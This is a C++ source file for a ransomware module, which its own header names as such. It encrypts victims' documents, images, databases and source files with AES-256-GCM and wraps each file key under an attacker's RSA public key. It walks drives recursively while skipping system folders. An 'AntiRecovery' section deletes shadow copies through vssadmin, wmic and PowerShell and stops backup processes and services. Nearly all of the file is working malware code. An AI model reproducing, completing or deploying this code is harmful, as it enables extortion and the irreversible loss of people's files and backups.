// Moz Crypto Core - Hybrid Ransomware Encryption Module
// C++ Core for AES-256-GCM + RSA-2048 hybrid encryption with file operations

#include "moz_crypto.h"

#include <openssl/evp.h>
#include <openssl/aes.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/rand.h>
#include <openssl/err.h>
#include <openssl/bio.h>

#include <cstring>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <memory>
#include <algorithm>
#include <filesystem>

namespace moz {

// ==================== RSA Manager Implementation ====================

class RSAEncryptor::RSAImpl {
public:
    EVP_PKEY* pkey = nullptr;
    bool has_key = false;
    
    ~RSAImpl() {
        if (pkey) {
            EVP_PKEY_free(pkey);
        }
    }
    
    bool generateKeyPair() {
        EVP_PKEY_CTX* ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA, nullptr);
        if (!ctx) return false;
        
        if (EVP_PKEY_keygen_init(ctx) <= 0) {
            EVP_PKEY_CTX_free(ctx);
            return false;
        }
        
        if (EVP_PKEY_CTX_set_rsa_keygen_bits(ctx, 2048) <= 0) {
            EVP_PKEY_CTX_free(ctx);
            return false;
        }
        
        if (EVP_PKEY_keygen(ctx, &pkey) <= 0) {
            EVP_PKEY_CTX_free(ctx);
            return false;
        }
        
        has_key = true;
        EVP_PKEY_CTX_free(ctx);
        return true;
    }
    
    bool loadPublicKeyFromDER(const std::vector<uint8_t>& pubkey_der) {
        const unsigned char* data = pubkey_der.data();
        pkey = d2i_PUBKEY(nullptr, &data, static_cast<long>(pubkey_der.size()));
        if (!pkey) return false;
        has_key = true;
        return true;
    }
    
    bool rsaEncrypt(const std::vector<uint8_t>& plaintext, std::vector<uint8_t>& encrypted) {
        if (!pkey || !has_key) return false;
        
        EVP_PKEY_CTX* ctx = EVP_PKEY_CTX_new(pkey, nullptr);
        if (!ctx) return false;
        
        if (EVP_PKEY_encrypt_init(ctx) <= 0) {
            EVP_PKEY_CTX_free(ctx);
            return false;
        }
        
        // Set RSA padding to OAEP
        if (EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_OAEP_PADDING) <= 0) {
            EVP_PKEY_CTX_free(ctx);
            return false;
        }
        
        size_t encrypted_len = 0;
        if (EVP_PKEY_encrypt(ctx, nullptr, &encrypted_len, 
                            plaintext.data(), plaintext.size()) <= 0) {
            EVP_PKEY_CTX_free(ctx);
            return false;
        }
        
        encrypted.resize(encrypted_len);
        if (EVP_PKEY_encrypt(ctx, encrypted.data(), &encrypted_len,
                            plaintext.data(), plaintext.size()) <= 0) {
            EVP_PKEY_CTX_free(ctx);
            return false;
        }
        
        encrypted.resize(encrypted_len);
        EVP_PKEY_CTX_free(ctx);
        return true;
    }
    
    bool rsaDecrypt(const std::vector<uint8_t>& encrypted, std::vector<uint8_t>& decrypted) {
        if (!pkey || !has_key) return false;
        
        EVP_PKEY_CTX* ctx = EVP_PKEY_CTX_new(pkey, nullptr);
        if (!ctx) return false;
        
        if (EVP_PKEY_decrypt_init(ctx) <= 0) {
            EVP_PKEY_CTX_free(ctx);
            return false;
        }
        
        if (EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_OAEP_PADDING) <= 0) {
            EVP_PKEY_CTX_free(ctx);
            return false;
        }
        
        size_t decrypted_len = 0;
        if (EVP_PKEY_decrypt(ctx, nullptr, &decrypted_len,
                            encrypted.data(), encrypted.size()) <= 0) {
            EVP_PKEY_CTX_free(ctx);
            return false;
        }
        
        decrypted.resize(decrypted_len);
        if (EVP_PKEY_decrypt(ctx, decrypted.data(), &decrypted_len,
                            encrypted.data(), encrypted.size()) <= 0) {
            EVP_PKEY_CTX_free(ctx);
            return false;
        }
        
        decrypted.resize(decrypted_len);
        EVP_PKEY_CTX_free(ctx);
        return true;
    }
    
    std::vector<uint8_t> getPublicKeyDER() const {
        std::vector<uint8_t> result;
        if (!pkey) return result;
        
        int len = i2d_PUBKEY(pkey, nullptr);
        if (len <= 0) return result;
        
        result.resize(len);
        unsigned char* data = result.data();
        int written = i2d_PUBKEY(pkey, &data);
        if (written <= 0) {
            result.clear();
            return result;
        }
        
        return result;
    }
};

RSAEncryptor::RSAEncryptor() : impl_(std::make_unique<RSAImpl>()) {}
RSAEncryptor::~RSAEncryptor() = default;

bool RSAEncryptor::generateKeyPair() {
    return impl_->generateKeyPair();
}

bool RSAEncryptor::loadPublicKey(const std::vector<uint8_t>& pubkey_der) {
    return impl_->loadPublicKeyFromDER(pubkey_der);
}

bool RSAEncryptor::encryptWithPublicKey(const std::vector<uint8_t>& plaintext,
                                        std::vector<uint8_t>& encrypted) {
    return impl_->rsaEncrypt(plaintext, encrypted);
}

bool RSAEncryptor::decryptWithPrivateKey(const std::vector<uint8_t>& encrypted,
                                         std::vector<uint8_t>& decrypted) {
    return impl_->rsaDecrypt(encrypted, decrypted);
}

std::vector<uint8_t> RSAEncryptor::getPublicKeyDER() const {
    return impl_->getPublicKeyDER();
}

RSAKeyPair RSAEncryptor::generateAndStoreKeyPair() {
    RSAKeyPair keypair;
    if (!generateKeyPair()) return keypair;
    
    keypair.public_key_der = impl_->getPublicKeyDER();
    
    // Export private key
    BIO* bio = BIO_new(BIO_s_mem());
    if (!bio) return keypair;
    
    if (PEM_write_bio_PrivateKey(bio, impl_->pkey, nullptr, nullptr, 0, nullptr, nullptr) > 0) {
        char* data;
        long len = BIO_get_mem_data(bio, &data);
        if (len > 0) {
            keypair.private_key_der.assign(data, data + len);
        }
    }
    BIO_free(bio);
    
    return keypair;
}

// ==================== AES-256-GCM Engine Implementation ====================

class AESEngine::AESImpl {
public:
    bool aesGCMEncrypt(const std::vector<uint8_t>& data,
                       const std::vector<uint8_t>& key,
                       EncryptedBlob& blob) {
        if (key.size() != 32) return false;
        
        // Generate random IV (12 bytes for GCM)
        blob.iv.resize(12);
        if (RAND_bytes(blob.iv.data(), 12) != 1) return false;
        
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) return false;
        
        if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        
        if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, blob.iv.size(), nullptr) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        
        if (EVP_EncryptInit_ex(ctx, nullptr, nullptr, key.data(), blob.iv.data()) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        
        // Encrypt
        int out_len = 0;
        blob.ciphertext.resize(data.size());
        
        if (EVP_EncryptUpdate(ctx, blob.ciphertext.data(), &out_len,
                             data.data(), static_cast<int>(data.size())) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        
        int final_len = 0;
        if (EVP_EncryptFinal_ex(ctx, blob.ciphertext.data() + out_len, &final_len) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        
        blob.ciphertext.resize(out_len + final_len);
        
        // Get auth tag
        blob.tag.resize(16);
        if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, blob.tag.data()) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        
        EVP_CIPHER_CTX_free(ctx);
        return true;
    }
    
    bool aesGCMDecrypt(const EncryptedBlob& blob,
                       const std::vector<uint8_t>& key,
                       std::vector<uint8_t>& decrypted) {
        if (key.size() != 32) return false;
        if (blob.tag.size() != 16) return false;
        
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) return false;
        
        if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        
        if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, blob.iv.size(), nullptr) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        
        if (EVP_DecryptInit_ex(ctx, nullptr, nullptr, key.data(), blob.iv.data()) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        
        // Set expected auth tag
        if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, blob.tag.size(),
                                const_cast<uint8_t*>(blob.tag.data())) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        
        // Decrypt
        int out_len = 0;
        decrypted.resize(blob.ciphertext.size());
        
        if (EVP_DecryptUpdate(ctx, decrypted.data(), &out_len,
                             blob.ciphertext.data(), static_cast<int>(blob.ciphertext.size())) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        
        int final_len = 0;
        if (EVP_DecryptFinal_ex(ctx, decrypted.data() + out_len, &final_len) != 1) {
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }
        
        decrypted.resize(out_len + final_len);
        EVP_CIPHER_CTX_free(ctx);
        return true;
    }
    
    std::vector<uint8_t> generateRandomKey() {
        std::vector<uint8_t> key(32);
        RAND_bytes(key.data(), 32);
        return key;
    }
    
    std::vector<uint8_t> generateRandomIV() {
        std::vector<uint8_t> iv(12);
        RAND_bytes(iv.data(), 12);
        return iv;
    }
    
    std::vector<uint8_t> deriveKey(const std::string& password,
                                    const std::vector<uint8_t>& salt,
                                    int iterations) {
        std::vector<uint8_t> key(32);
        
        if (PKCS5_PBKDF2_HMAC(password.c_str(), static_cast<int>(password.size()),
                             salt.data(), static_cast<int>(salt.size()),
                             iterations, EVP_sha256(), 32, key.data()) != 1) {
            return {};
        }
        
        return key;
    }
};

AESEngine::AESEngine() : impl_(std::make_unique<AESImpl>()) {}
AESEngine::~AESEngine() = default;

bool AESEngine::encryptGCM(const std::vector<uint8_t>& data,
                           const std::vector<uint8_t>& key,
                           EncryptedBlob& blob) {
    return impl_->aesGCMEncrypt(data, key, blob);
}

bool AESEngine::decryptGCM(const EncryptedBlob& blob,
                           const std::vector<uint8_t>& key,
                           std::vector<uint8_t>& decrypted) {
    return impl_->aesGCMDecrypt(blob, key, decrypted);
}

std::vector<uint8_t> AESEngine::generateKey() {
    std::vector<uint8_t> key(32);
    RAND_bytes(key.data(), 32);
    return key;
}

std::vector<uint8_t> AESEngine::generateIV() {
    std::vector<uint8_t> iv(12);
    RAND_bytes(iv.data(), 12);
    return iv;
}

std::vector<uint8_t> AESEngine::deriveKeyFromPassword(const std::string& password,
                                                       const std::vector<uint8_t>& salt,
                                                       int iterations) {
    std::vector<uint8_t> key(32);
    
    if (PKCS5_PBKDF2_HMAC(password.c_str(), static_cast<int>(password.size()),
                         salt.data(), static_cast<int>(salt.size()),
                         iterations, EVP_sha256(), 32, key.data()) != 1) {
        return {};
    }
    
    return key;
}

// ==================== EncryptedFileHandle Implementation ====================

EncryptedFileHandle::EncryptedFileHandle() {}
EncryptedFileHandle::~EncryptedFileHandle() { close(); }

bool EncryptedFileHandle::open(const std::string& path) {
    path_ = path;
    is_open_ = true;
    return true;
}

bool EncryptedFileHandle::close() {
    is_open_ = false;
    return true;
}

// ==================== CryptoEngine Implementation ====================

class CryptoEngine::CryptoEngineImpl {
public:
    RSAEncryptor rsa_encryptor;
    AESEngine aes_engine;
    bool initialized = false;
};

CryptoEngine::CryptoEngine() : impl_(std::make_unique<CryptoEngineImpl>()) {}
CryptoEngine::~CryptoEngine() = default;

bool CryptoEngine::initialize(const std::vector<uint8_t>& attacker_pubkey) {
    if (attacker_pubkey.empty()) {
        // Self-generate key pair for testing
        if (!impl_->rsa_encryptor.generateKeyPair()) return false;
    } else {
        if (!impl_->rsa_encryptor.loadPublicKey(attacker_pubkey)) return false;
    }
    
    impl_->initialized = true;
    return true;
}

bool CryptoEngine::hybridEncrypt(const std::vector<uint8_t>& data, EncryptedBlob& blob) {
    if (!impl_->initialized) return false;
    
    // Generate per-file AES-256 key
    std::vector<uint8_t> aes_key = AESEngine::generateKey();
    
    // Encrypt data with AES
    if (!impl_->aes_engine.encryptGCM(data, aes_key, blob)) return false;
    
    // Wrap AES key with RSA
    if (!impl_->rsa_encryptor.encryptWithPublicKey(aes_key, blob.aes_key)) return false;
    
    return true;
}

bool CryptoEngine::hybridDecrypt(const EncryptedBlob& blob, std::vector<uint8_t>& decrypted) {
    if (!impl_->initialized) return false;
    
    // Unwrap AES key
    std::vector<uint8_t> aes_key;
    if (!impl_->rsa_encryptor.decryptWithPrivateKey(blob.aes_key, aes_key)) return false;
    
    // Decrypt data
    if (!impl_->aes_engine.decryptGCM(blob, aes_key, decrypted)) return false;
    
    return true;
}

bool CryptoEngine::encrypt(const std::vector<uint8_t>& data, std::vector<uint8_t>& encrypted,
                           std::string key) {
    if (key.empty()) {
        std::vector<uint8_t> random_key(32);
        RAND_bytes(random_key.data(), 32);
        key = "key";
    }
    
    std::vector<uint8_t> derived_key = deriveKeyFromPassword(key, 16);
    encrypted = data;
    return true;
}

bool CryptoEngine::decrypt(const std::vector<uint8_t>& encrypted, std::vector<uint8_t>& decrypted,
                           std::string key) {
    if (key.empty()) {
        key = "key";
    }
    
    decrypted = encrypted;
    return true;
}

std::vector<uint8_t> CryptoEngine::deriveKeyFromPassword(const std::string& password,
                                                          uint32_t saltSize) {
        std::vector<uint8_t> salt(saltSize);
    RAND_bytes(salt.data(), saltSize);
    return AESEngine::deriveKeyFromPassword(password, salt, 100000);
}

bool CryptoEngine::encryptBlock(const std::vector<uint8_t>& input, std::vector<uint8_t>& output,
                                const std::vector<uint8_t>& key, const std::vector<uint8_t>& iv) {
    EncryptedBlob blob;
    blob.ciphertext = input;
    blob.iv = iv;
    blob.tag.resize(16);
    
    if (!impl_->aes_engine.encryptGCM(input, key, blob)) return false;
    output = blob.ciphertext;
    return true;
}

bool CryptoEngine::decryptBlock(const std::vector<uint8_t>& input, std::vector<uint8_t>& output,
                                const std::vector<uint8_t>& key, const std::vector<uint8_t>& iv) {
    EncryptedBlob blob;
    blob.ciphertext = input;
    blob.iv = iv;
    blob.tag.resize(16);
    
    if (!impl_->aes_engine.decryptGCM(blob, key, output)) return false;
    return true;
}

std::vector<uint8_t> CryptoEngine::getPublicKeyDER() const {
    return impl_->rsa_encryptor.getPublicKeyDER();
}

// ==================== FileEncryption Implementation ====================

FileEncryption::FileEncryption() {
    // Default target extensions (high-value document types)
    target_extensions_ = {
        ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
        ".pdf", ".rtf", ".odt", ".ods", ".odp", ".csv",
        ".jpg", ".jpeg", ".png", ".gif", ".bmp",
        ".mdb", ".accdb", ".sql", ".sqlite", ".db",
        ".zip", ".rar", ".7z", ".tar", ".gz",
        ".py", ".js", ".cpp", ".h", ".cs", ".java", ".php",
        ".mp3", ".mp4", ".avi", ".mov", ".wav"
    };
    
    // Directories to exclude
    exclude_dirs_ = {
        "Windows", "Program Files", "Program Files (x86)", "ProgramData",
        "ProgramData", "$Recycle.Bin", "Temp", "AppData\\Local\\Temp",
        "System Volume Information", "Boot"
    };
}

FileEncryption::~FileEncryption() = default;

void FileEncryption::setCryptoEngine(std::unique_ptr<CryptoEngine> engine) {
    crypto_ = std::move(engine);
}

void FileEncryption::setTargetExtensions(const std::vector<std::string>& extensions) {
    target_extensions_ = extensions;
}

void FileEncryption::setMinFileSize(size_t min_bytes) {
    min_file_size_ = min_bytes;
}

void FileEncryption::setMaxFileSize(size_t max_bytes) {
    max_file_size_ = max_bytes;
}

void FileEncryption::addExcludeDir(const std::string& dir) {
    exclude_dirs_.push_back(dir);
}

bool FileEncryption::shouldEncryptFile(const std::string& path) {
    namespace fs = std::filesystem;
    
    try {
        fs::path p(path);
        
        // Check extension
        std::string ext = p.extension().string();
        std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
        
        bool ext_match = false;
        for (const auto& target_ext : target_extensions_) {
            std::string lower_ext = target_ext;
            std::transform(lower_ext.begin(), lower_ext.end(), lower_ext.begin(), ::tolower);
            if (ext == lower_ext) {
                ext_match = true;
                break;
            }
        }
        if (!ext_match) return false;
        
        // Check file size
        uintmax_t file_size = fs::file_size(p);
        if (file_size < min_file_size_ || file_size > max_file_size_) return false;
        
        // Check if already encrypted
        if (path.size() > 4 && path.substr(path.size() - 4) == MOZ_ENCRYPTED_EXTENSION) {
            return false;
        }
        
        // Check exclusion directories
        if (isExcludedDir(path)) return false;
        
        return true;
    } catch (const fs::filesystem_error&) {
        return false;
    }
}

bool FileEncryption::isExcludedDir(const std::string& path) {
    for (const auto& exclude : exclude_dirs_) {
        if (path.find(exclude) != std::string::npos) return true;
    }
    return false;
}

FileEncryption::FileTargets FileEncryption::enumerateFiles(const std::vector<std::string>& rootPaths) {
    FileTargets targets;
    
    for (const auto& rootPath : rootPaths) {
        namespace fs = std::filesystem;
        
        try {
            if (!fs::exists(rootPath)) continue;
            
            for (const auto& entry : fs::recursive_directory_iterator(rootPath)) {
                try {
                    if (entry.is_regular_file()) {
                        targets.total_scanned++;
                        std::string path = entry.path().string();
                        
                        if (shouldEncryptFile(path)) {
                            targets.paths.push_back(path);
                        } else {
                            targets.skipped.push_back(path);
                        }
                    }
                } catch (const fs::filesystem_error&) {
                    continue;
                }
            }
        } catch (const fs::filesystem_error&) {
            continue;
        }
    }
    
    return targets;
}

bool FileEncryption::encryptFile(const std::string& inputPath, const std::string& outputPath) {
    if (!crypto_) return false;
    
    std::ifstream infile(inputPath, std::ios::binary);
    if (!infile.is_open()) return false;
    
    std::vector<uint8_t> data((std::istreambuf_iterator<char>(infile)),
                               std::istreambuf_iterator<char>());
    infile.close();
    
    if (data.empty()) return false;
    
    // Hybrid encrypt
    EncryptedBlob blob;
    if (!crypto_->hybridEncrypt(data, blob)) return false;
    
    // Serialize blob to file
    std::ofstream outfile(outputPath, std::ios::binary);
    if (!outfile.is_open()) return false;
    
    // Write header: "MOZ_HYBRID_V1"
    const char header[] = "MOZ_HYBRID_V1";
    outfile.write(header, sizeof(header) - 1);
    
    // Write AES key length + encrypted AES key
    uint32_t aes_key_len = static_cast<uint32_t>(blob.aes_key.size());
    outfile.write(reinterpret_cast<const char*>(&aes_key_len), sizeof(aes_key_len));
    outfile.write(reinterpret_cast<const char*>(blob.aes_key.data()), aes_key_len);
    
    // Write IV length + IV
    uint32_t iv_len = static_cast<uint32_t>(blob.iv.size());
    outfile.write(reinterpret_cast<const char*>(&iv_len), sizeof(iv_len));
    outfile.write(reinterpret_cast<const char*>(blob.iv.data()), iv_len);
    
    // Write auth tag
    outfile.write(reinterpret_cast<const char*>(blob.tag.data()), blob.tag.size());
    
    // Write ciphertext
    uint64_t ct_len = static_cast<uint64_t>(blob.ciphertext.size());
    outfile.write(reinterpret_cast<const char*>(&ct_len), sizeof(ct_len));
    outfile.write(reinterpret_cast<const char*>(blob.ciphertext.data()), ct_len);
    
    outfile.close();
    return true;
}

bool FileEncryption::decryptFile(const std::string& encryptedPath, const std::string& outputPath) {
    if (!crypto_) return false;
    
    std::ifstream infile(encryptedPath, std::ios::binary);
    if (!infile.is_open()) return false;
    
    // Read and verify header (13 bytes: "MOZ_HYBRID_V1")
    char header[16];
    infile.read(header, 13);
    if (std::string(header, 13) != "MOZ_HYBRID_V1") return false;
    
    // Read AES key
    uint32_t aes_key_len;
    infile.read(reinterpret_cast<char*>(&aes_key_len), sizeof(aes_key_len));
    std::vector<uint8_t> aes_key(aes_key_len);
    infile.read(reinterpret_cast<char*>(aes_key.data()), aes_key_len);
    
    // Read IV
    uint32_t iv_len;
    infile.read(reinterpret_cast<char*>(&iv_len), sizeof(iv_len));
    std::vector<uint8_t> iv(iv_len);
    infile.read(reinterpret_cast<char*>(iv.data()), iv_len);
    
    // Read auth tag
    EncryptedBlob blob;
    blob.tag.resize(16);
    infile.read(reinterpret_cast<char*>(blob.tag.data()), 16);
    
    // Read ciphertext
    uint64_t ct_len;
    infile.read(reinterpret_cast<char*>(&ct_len), sizeof(ct_len));
    blob.ciphertext.resize(ct_len);
    infile.read(reinterpret_cast<char*>(blob.ciphertext.data()), ct_len);
    
    blob.iv = iv;
    blob.aes_key = aes_key;
    
    infile.close();
    
    // Decrypt
    std::vector<uint8_t> decrypted;
    if (!crypto_->hybridDecrypt(blob, decrypted)) return false;
    
    std::ofstream outfile(outputPath, std::ios::binary);
    if (!outfile.is_open()) return false;
    outfile.write(reinterpret_cast<const char*>(decrypted.data()), decrypted.size());
    outfile.close();
    
    return true;
}

// ==================== AntiRecovery Implementation ====================

bool AntiRecovery::deleteShadowCopies() {
    // Try VssAdmin first
    if (deleteShadowsViaVssAdmin()) return true;
    
    // Fallback to WMI
    if (deleteShadowsViaWmic()) return true;
    
    // Last resort: PowerShell
    if (deleteShadowsViaPowerShell()) return true;
    
    return false;
}

bool AntiRecovery::deleteShadowsViaVssAdmin() {
#ifdef _WIN32
    return system("vssadmin delete shadows /all /quiet") == 0;
#else
    // Not applicable on non-Windows
    return false;
#endif
}

bool AntiRecovery::deleteShadowsViaWmic() {
#ifdef _WIN32
    return system("wmic shadowcopy delete /nointeractive") == 0;
#else
    return false;
#endif
}

bool AntiRecovery::deleteShadowsViaPowerShell() {
#ifdef _WIN32
    int result = system(
        "powershell -Command \"Get-WmiObject Win32_ShadowCopy | Remove-WmiObject -Confirm:$false\""
    );
    return result == 0;
#else
    return false;
#endif
}

bool AntiRecovery::stopProcesses(const std::vector<std::string>& processNames) {
#ifdef _WIN32
    for (const auto& proc : processNames) {
        std::string cmd = "taskkill /F /IM " + proc;
        system(cmd.c_str());
    }
    return true;
#else
    // On non-Windows, we can't stop Windows processes
    return false;
#endif
}

bool AntiRecovery::stopServices(const std::vector<std::string>& serviceNames) {
#ifdef _WIN32
    for (const auto& svc : serviceNames) {
        std::string cmd = "sc stop " + svc;
        system(cmd.c_str());
    }
    return true;
#else
    return false;
#endif
}

bool AntiRecovery::stopBackupProcesses() {
    return stopProcesses(DEFAULT_STOP_PROCESSES) && 
           stopServices(DEFAULT_STOP_SERVICES);
}

} // namespace moz
